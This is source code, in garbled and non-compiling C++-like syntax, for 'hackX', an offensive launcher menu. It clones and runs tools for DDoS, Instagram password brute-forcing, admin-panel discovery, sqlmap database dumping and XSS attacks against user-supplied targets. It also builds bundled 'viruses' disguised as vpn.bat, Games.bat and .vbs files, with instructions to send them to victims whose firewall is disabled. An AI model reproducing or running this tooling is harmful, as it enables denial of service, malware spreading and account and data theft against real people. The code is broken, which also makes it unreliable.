#include "import"
#include <random>
space

_
	random_device rd;
	in n;
        clears
	print "\033[1;35mVersion Code:\033[1;m" << rd() << nline;
	printf"Hi welcome to hackX. \n You can hack in this application\n \033[1;36mFirst you must app in put original page or write Command (mv [NAME FILE] to ~/)\033[1;m\n \033[1;31mAttention:You must access to root , with command (su) and write your password\033[1;m \n");
	print " ...please wait..." << nline;
		sleep(5);
	system "unzip Data.zip");
	system "rm -rf Data.zip");
	clears
	print "HACK X" << nline;
	print "| \033[1;32m1)Attack DDOS\033[1;m" << "\n| \033[1;32m2)Create the Virus\033[1;m" << "\n| \033[1;32m3)Get Proxy\033[1;m" << "\n| \033[1;32m4)Cracker Instagram\033[1;m" << "\n| \033[1;32m5)Find the Username of the Admin Website\033[1;m" << "\n| \033[1;32m6)Find IP Website\033[1;m" << "\n| \033[1;32m7)Attack SQL Injection\033[1;m" << "\n| \033[1;32m8)Website Template\033[1;m" << "\n| \033[1;32m9)Attack XSS\033[1;m" << "\n| \033[1;32m10)Create Paassword List\033[1;m" << "\n| \033[1;32m11)Checker SSL Websites\033[1;m";
	print "\n\n| \033[1;34m50)Debug\033[1;m" << "\n| \033[1;34m51)Change Password Router\033[1;m" << "\n| \033[1;34m52)Go to DarkWeb\033[1;m" << "\n| \033[1;34m53)View Source\033[1;m"<< "\n| \033[1;34m54)Test Internet Speed\033[1;m";
	
	print string(4 , '\n'); 
	print "\033[1;36m99)About______________________________100)Update\033[1;m" << nline;
	print "\n \nPlease Enter Number:";
	sent n;
	ring 1 == n){
		text s;
		text str;
		text spam;
		text num;
		InstallSystem("python3");
		InstallSystem("git");
 		system "git clone git://github.com/cyweb/hammer.git");
		system "mv ~/hackX/hammer/hammer.py ~/hackX/");
		system "mv ~/hackX/hammer/headers.txt ~/hackX/");
		system "mv ~/hackX/hammer/README.md ~/hackX/");
		clears
		print "Please Enter IP Number:";
 		sent s;	
		print "Please Enter Port Number:";
		sent spam;
		print "Please Enter thread Number:";
		sent num;
		str="python hammer.py -s "+s+" -p "+spam+" -t "+num;
		str="python3 hammer.py -s "+s+" -p "+spam+" -t "+num;
		


		fix $ * commands = str.c_str();
			
		system commands);
		system "rm -rf headers.txt");
		system "rm -rf hammer.py");
		system "rm -rf README.md");
		system "rm -rf hammer");
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
		}
	backring ring 2 == n){
		in sp;
		clears
		print "which one you choosing?";
		print "\n \033[1;32m1) Virus For Windows\033[1;m" << "\n \033[1;32m2) Virus For Linux\033[1;m";
		print string(10 , '\n'); 

		print "Please Enter Number:";
		sent sp;
		ring sp == 1){
			InstallSystem("g++");
			InstallSystem("clang++");
			InstallSystem("clang");
			in vus;
			clears
			print "which one virus?" << "\n\033[1;32m 1)virus for windows OS\033[1;m" << "\n\033[1;32m 2)virus for Hard full\033[1;m" << "\n\033[1;32m 3)virus for CD Rom\033[1;m" << "\n\033[1;32m 4)virus for error\033[1;m" << "\n\033[1;32m 5)virus for message \033[1;m";
			print string(10 , '\n'); 

			print "Please Enter Number:";
			sent vus;
			ring 1 == vus){
			system "cp ~/hackX/Data/virusWindows.cpp ~/hackX/");
			system "g++ virusWindows.cpp");	
			system "./a.out");
			system "mkdir Output");

			system "mv ~/hackX/hi.txt ~/hackX/Output/vpn.bat");
			system "rm -rf virusWindows.cpp");
			system "g++ hackx.cpp");
			system "clang++ hackx.cpp");
			system "mv ~/hackX/a.out ~/hackX/hackx.run");
			print "  \033[1;32mCreated virus for Windows\033[1;m";
			write(" '\033[1;36mHelp: File Name is vpn.bat and Must you send virus a device \033[1;m'");
			write(" '\033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m'");
			printf "\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			print __TIME__ << nline;
			print "Bye";
			}
			backring ring 2 == vus){
			system "cp ~/hackX/Data/virusHard.cpp ~/hackX/");
			system "g++ virusHard.cpp");
			system "./a.out");
			system "mkdir Output"); 
			system "mv ~/hackX/hi.txt ~/hackX/Output/Games.bat");
			system "rm -rf virusHard.cpp");
			system "g++ hackx.cpp");
			system "mv ~/hackX/a.out ~/hackX/hackx.run");
			print "  \033[1;32mCreated virus for Windows\033[1;m";
			write(" '\033[1;36mHelp: File Name Games.bat and Must you send virus a device\033[1;m'");
			write(" '\033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m'");
			printf "\n \033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			print __TIME__ << "\n";
			print "Bye";
			}
			backring ring 3 == vus){
			system "cp ~/hackX/Data/virusCD.vbs ~/hackX/");
			system "mkdir Output");
			system "mv ~/hackX/virusCD.vbs ~/hackX/Output/debugCD.vbs");
			system "g++ hackx.cpp");
			system "mv ~/hackX/a.out ~/hackX/hackx.run");
			print "  \033[1;32mCreated virus for CD Rom\033[1;m";
			write(" '\033[1;36mHelp: File Name debugCD.vbs and Must you send virus a device\033[1;m'");
			write(" '\033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m'");
			printf "\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			print __TIME__ << nline;
			print "Bye";
			}
			backring ring 4 == vus){
			system "cp ~/hackX/Data/virusError.vbs ~/hackX/");
			system "mkdir Output");
			system "mv ~/hackX/virusError.vbs ~/hackX/Output/Messager.vbs");
			system "g++ hackx.cpp");
			system "clang++ hackx.cpp");
			system "mv ~/hackX/a.out ~/hackX/hackx.run");
			print "  \033[1;32mCreated virus for Messager\033[1;m";
			write(" '\033[1;36mHelp: File Name Messager.vbs and Must you send virus a device\033[1;m'");
			write(" '\033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m'");
			printf "\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			print __TIME__ << nline;
			print "Bye";
			}
			backring ring 5 == vus){
			system "cp ~/hackX/Data/virusVoice.vbs ~/hackX/");
			system "mkdir Output");
			system "mv ~/hackX/virusVoice.vbs ~/hackX/Output/Voice.vbs");
			system "g++ hackx.cpp");
			system "clang++ hackx.cpp");
			system "mv ~/hackX/a.out ~/hackX/hackx.run");
			print "  \033[1;32mCreated virus for Voice\033[1;m";
			write(" '\033[1;36mHelp: File Name Messager.vbs and Must you send virus a device\033[1;m'");
			write(" '\033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m'");
			printf "\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			print __TIME__ << nline;
			print "Bye";
			}
		}
		backring ring sp == 2){
			InstallSystem("git");
			InstallSystem("clang++");
			InstallSystem("clang");
			int vus;
			system "cp ~/hackX/Data/virusLinux.cpp ~/hackX/");
			system "g++ virusLinux.cpp");
			system "mkdir Output");
			system "mv ~/hackX/a.out ~/hackX/Output/vpn.run");
			system "rm -rf virusLinux.cpp");
			system "g++ hackx.cpp");
			system "clang++ hackx.cpp");
			system "mv ~/hackX/a.out ~/hackX/hackx.run");
			print "  \033[1;32mcreated virus for Linux\033[1;m";
			write(" '\033[1;36mhelp: File Name is vpn.run and Must you send virus a device\033[1;m'");
			write(" '\033[1;31mAttention: must be device Linux\033[1;m'");
			printf "\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			print __TIME__ << nline;
			print "Bye";
		}
		backring{
		printf "\033[1;31m((((([[[[[[Unsuccess In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
		}
	}
	backring ring 3 == n){
		InstallSystem("git");
		system "git clone git://github.com/stamparm/fetch-some-proxies.git");
		system "mv ~/hackX/fetch-some-proxies/fetch.py ~/hackX/");
		clears
		system "python2 fetch.py --threads=300");
		system "rm -rf fetch-some-proxies");
		system "rm -rf fetch.py");
		sleep(1);
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
		}
	backring ring 4 == n){
		InstallSystem("git");
		system "git clone git://github.com/thelinuxchoice/instainsane.git");
		system "mv ~/hackX/instainsane/instainsane.sh ~/hackX/");
		system "mv ~/hackX/instainsane/install.sh ~/hackX/");
		system "mv ~/hackX/instainsane/passwords.lst ~/hackX");
		system "rm -rf instainsane");
		system "chmod +x install.sh");
		system "./install.sh");
		system "chmod +x instainsane.sh");
		system "./instainsane.sh");
		system "gedit found.instainsane");
		system "nano found.instainsane");
		system "rm -rf nottested.lst");
		system "rm -rf install.sh");
		system "rm -rf instainsane.sh");
		system "rm -rf passwords.lst");
		system "rm -rf multitor");
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 5 == n){
		text s2;
		text str2;
		InstallSystem("git");
		system "git clone git://github.com/s0md3v/Breacher.git");
		system "mv ~/hackX/Breacher/breacher.py ~/hackX/");
		system "mv ~/hackX/Breacher/paths.txt ~/hackX/");
		system "mv ~/hackX/Breacher/LICENSE ~/hackX/");
		clears
		print "Website Address:";
		sent s2;	
		str2="python2 breacher.py -u "+s2;
		
		fix $ * commands = str2.Cstr;
			
		system commands); 
		system "rm -rf Breacher");
		system "rm -rf breacher.py");
		system "rm -rf paths.txt");
		system "rm -rf LICENSE");
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
		}
	backring ring 6 == n){
		text s3;
		text str3;
		
		UpdateSystem();
		InstallSystem("nmap");
		clears
		print "please Enter Website:";
		sent s3;	
		str3="nmap -v -A "+s3;
		
		fix $ *commands = str3.Cstr;
			
		system commands); 
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
		}
	backring ring 7 == n){
		text s4;
		text str4;
		InstallSystem("git");
		InstallSystem("python");
		InstallSystem("python2");
		system "git clone --depth 1 git://github.com/sqlmapproject/sqlmap.git sqlmap-dev");
		system "mv ~/hackX/sqlmap-dev/COMMITMENT ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/doc ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/lib ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/plugins ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/sqlmapapi.py ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/sqlmap.py ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/thirdparty ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/data ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/extra ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/LICENSE ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/README.md ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/sqlmap.conf ~/hackX/");
		system "mv ~/hackX/sqlmap-dev/tamper ~/hackX/");
		clears
		print "Please Enter the Website That Has the Bug(Without http://):";
		sent s4;	
		str4="python2 sqlmap.py -u http://"+s4+" --dump";
		
		fix $ * commands = str4.Cstr;
			
		system commands);
		system "rm -rf sqlmap-dev");
		system "rm -rf COMMITMENT");
		system "rm -rf doc");
		system "rm -rf lib");
		system "rm -rf plugins");
		system "rm -rf sqlmapapi.py");
		system "rm -rf sqlmap.py");
		system "rm -rf thirdparty");
		system "rm -rf data");
		system "rm -rf extra");
		system "rm -rf LICENSE");
		system "rm -rf README.md");
		system "rm -rf sqlmap.conf");
		system "rm -rf tamper");
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}  
	backring ring 8 == n){
		text str5;
		text s5;
		InstallSystem("httrack");
		system "mkdir templateWeb");
		clears
		print "please Enter Website for Receive Template:";
		sent s5;
		
		str5="httrack "+s5+" +* -r6 -O ~/hackX/templateWeb";

		fix $ * commands = str5.Cstr;
		system commands);
		printf "\033[1;33m Received In File templateWeb\033[1;m \n");
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";		 
	}
	backring ring 9 == n){
		text str6;
		text s6;
		InstallSystem("git");
		InstallSystem("python");
		InstallSystem("python2");
		InstallSystem("python-pip");
		system "git clone git://github.com/epsylon/xsser.git");
		InstallSystem("python-pycurl");
		InstallSystem("python-xmlbuilder");
		InstallSystem("python-beautifulsoup");
		InstallSystem("python-geoip");
		system "pip install geoip");
		system "pip install pycurl");
		system "pip install xmlbuilder");
		system "pip install beautifulsoup");
		system "mv ~/hackX/xsser/xsser/setup.py ~/hackX");
		system "mv ~/hackX/xsser/xsser/xsser ~/hackX/hackXSS");
		system "mv ~/hackX/xsser/xsser/Makefile ~/hackX");
		system "mv ~/hackX/xsser/xsser/gtk ~/hackX");
		system "mv ~/hackX/xsser/xsser/doc ~/hackX");
		system "mv ~/hackX/xsser/xsser/core ~/hackX");
		system "python setup.py install");
		clears
		print "Please Enter Website for Attack:";
		sent s6;
		
		str6="./hackXSS --all "+s6+" -c 99999 --Cw 1 --Cl -s --no-head --user-agent --reverse-check --follow-redirects --follow-limit 50 --threads 10 --timeout 60 --retries 2 --delay 5 --auto --Coo --Xsa --Xsr --Dom --Dcp --Ind --Doss --Onm --Ifr --silent";

		fix $ *commands = str6.Cstr;
		system commands);
		system "rm -rf xsser.egg-info");
		system "rm -rf build");
		system "rm -rf doc");
		system "rm -rf gtk");
		system "rm -rf core");
		system "rm -rf hackXSS");
		system "rm -rf setup.py");
		system "rm -rf Makefile");
		system "rm -rf xsser");
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 10 == n){
		InstallSystem("python3");
		InstallSystem("python");
		InstallSystem("python2");
		InstallSystem("git");
		system "git clone git://github.com/Mebus/cupp.git");
		system "mv ~/hackX/cupp/CHANGELOG.md ~/hackX/");
		system "mv ~/hackX/cupp/cupp.cfg ~/hackX/");
		system "mv ~/hackX/cupp/cupp.py ~/hackX/");
		system "mv ~/hackX/cupp/LICENSE ~/hackX/");
		system "mv ~/hackX/cupp/README.md ~/hackX/");
		system "mv ~/hackX/cupp/test_cupp.py ~/hackX/");
		clears
		system "./cupp.py -i");
		system "rm -rf cupp");
		system "rm -rf CHANGELOG.md");
		system "rm -rf cupp.cfg");
		system "rm -rf cupp.py");
		system "rm -rf LICENSE");
		system "rm -rf README.md");
		system "rm -rf test_cupp.py");
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 11 == n){
		text str8;
		text s8;
		InstallSystem("git");
		InstallSystem("python");
		InstallSystem("python2");
		InstallSystem("python-pip");
		system "git clone git://github.com/narbehaj/ssl-checker.git");
		system "mv ~/hackX/ssl-checker/LICENSE ~/hackX/");
		system "mv ~/hackX/ssl-checker/README.md ~/hackX/");
		system "mv ~/hackX/ssl-checker/requirements.txt ~/hackX/");
		system "mv ~/hackX/ssl-checker/socks.py ~/hackX/");
		system "mv ~/hackX/ssl-checker/socks.pyc ~/hackX/");
		system "mv ~/hackX/ssl-checker/ssl_checker.py ~/hackX/");
		system "pip install -r requirements.txt");
		clears
		print "Enter Website for Check SSL:";
		sent s8;
		
		str8="./ssl_checker.py -H "+s8;

		fix $ *commands = str8.Cstr;
		system commands);
		system "rm -rf LICENSE");
		system "rm -rf README.md");
		system "rm -rf requirements.txt");
		system "rm -rf socks.py");
		system "rm -rf ssl_checker.py");
		system "rm -rf ssl-checker");
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 50 == n){
		system "rm -rf /var/cache/apt/archives/lock");
		clears
		printf "Debug Successful\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 51 == n){
		printf "Other 5 Seconds To Browser Firefox\n");
		sleep(5);	
		clears	
		system "firefox 192.168.1.1");
		
		printf "HELP: Enter the Word \033[1;32m(admin)\033[1;m In Username And Password\n");
		printf "2 Steps \033[1;32m(wireless setup)\033[1;m To Click\n");
		printf "3 Steps \033[1;32m(wireless security)\033[1;m To Click\n"); 
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 52 == n){
		system "wget https://github.com/TheTorProject/gettorbrowser/releases/download/v8.0.2/tor-browser-linux64-8.0.2_en-US.tar.xz");
		system "tar -xf tor-browser-linux64-8.0.2_en-US.tar.xz");
		system "mv ~/hackX/tor-browser_en-US/Browser/abicheck ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/application.ini ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/browser ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/chrome.manifest ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/defaults ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/dependentlibs.list ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/dictionaries ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/execdesktop ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/firefox ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/firefox.real ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/fonts ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/gtk2 ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/icons ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libfreeblpriv3.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/liblgpllibs.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libmozavcodec.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libmozavutil.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libmozgtk.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libmozsandbox.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libmozsqlite3.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libnspr4.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libnss3.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libnssckbi.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libnssdbm3.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libnssutil3.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libplc4.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libplds4.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libsmime3.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libsoftokn3.so ~/hackX/");	
		system "mv ~/hackX/tor-browser_en-US/Browser/libssl3.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/libxul.so ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/omni.ja ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/pingsender ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/platform.ini ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/plugin-container ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/precomplete ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/removed-files ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/start-tor-browser ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/start-tor-browser.desktop ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/tbb_version.json ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/TorBrowser ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/updater ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/updater.ini ~/hackX/");
		system "mv ~/hackX/tor-browser_en-US/Browser/update-settings.ini ~/hackX/");
		clears
		print "Go to Firefox\n";
		system "./firefox http://5u56fjmxu63xcmbk.onion");
		system "rm -rf libplc4.so");
		system "rm -rf tor-browser_en-US");
		system "rm -rf tor-browser-linux64-8.0.2_en-US.tar.xz");
		system "rm -rf update-settings.ini");
		system "rm -rf updater.ini");
		system "rm -rf updater");
		system "rm -rf TorBrowser");
		system "rm -rf tbb_version.json");
		system "rm -rf start-tor-browser.desktop");	
		system "rm -rf start-tor-browser");
		system "rm -rf removed-files");
		system "rm -rf precomplete");
		system "rm -rf plugin-container");
		system "rm -rf platform.ini");
		system "rm -rf pingsender");
		system "rm -rf omni.ja");
		system "rm -rf libxul.so");
		system "rm -rf libssl3.so");
		system "rm -rf libsoftokn3.so");
		system "rm -rf libsmime3.so");
		system "rm -rf libplds4.so");
		system "rm -rf libnssutil3.so");
		system "rm -rf libnssdbm3.so");
		system "rm -rf libnssckbi.so");
		system "rm -rf libnss3.so");
		system "rm -rf libnspr4.so");
		system "rm -rf libmozsqlite3.so");
		system "rm -rf libmozsandbox.so");
		system "rm -rf libmozgtk.so");
		system "rm -rf libmozavutil.so");
		system "rm -rf libmozavcodec.so");
		system "rm -rf liblgpllibs.so");
		system "rm -rf libfreeblpriv3.so");
		system "rm -rf icons");
		system "rm -rf gtk2");
		system "rm -rf fonts");
		system "rm -rf firefox.real");
		system "rm -rf firefox");
		system "rm -rf execdesktop");
		system "rm -rf dictionaries");
		system "rm -rf dependentlibs.list");
		system "rm -rf defaults");
		system "rm -rf chrome.manifest");
		system "rm -rf browser");
		system "rm -rf application.ini");
		system "rm -rf abicheck");
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 53 == n){
		text str7;
		text s7;
		exit
		exit
		clears
		print "Please Enter Website:";
		sent s7;
		
		str7="firefox view-source:"+s7;

		fix $ *commands = str7.Cstr;
		system commands);
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 54 == n){
		text str9;
		text s9;
		clears
		print "Which Website Should Check for Internet Speed?";
		sent s9;
		str9="ping "+s9;
		fix $ *commands = str9.Cstr;
		system commands);
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 99 == n){
		clears
		print string(6 , '\n');
		print "                   Designer:Cunknown" << nline;
		print "                  Programmer:Cunknown" << nline;
		printf "\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}
	backring ring 100 == n){
		
		system "git clone git://github.com/anonymous14725/hackX.git");
		system "mv ~/hackX/hackX/hackx.run ~/hackX");
		system "mv ~/hackX/hackX/Data.zip ~/hackX");
		system "mv ~/hackX/hackX/hackx.cpp ~/hackX");
		system "unzip Data.zip");
		system "chmod +x hackx.run");
		system "rm -rf hackX");
		system "rm -rf Data.zip");
		system "g++ hackx.cpp");
		system "clang++ hackx.cpp");
		system "./a.out");
	}
	backring{
		printf "\033[1;31m((((([[[[[[Unsuccess In Load]]]]])))))\033[1;m\n \a");
		print __TIME__ << nline;
		print "Bye";
	}

End
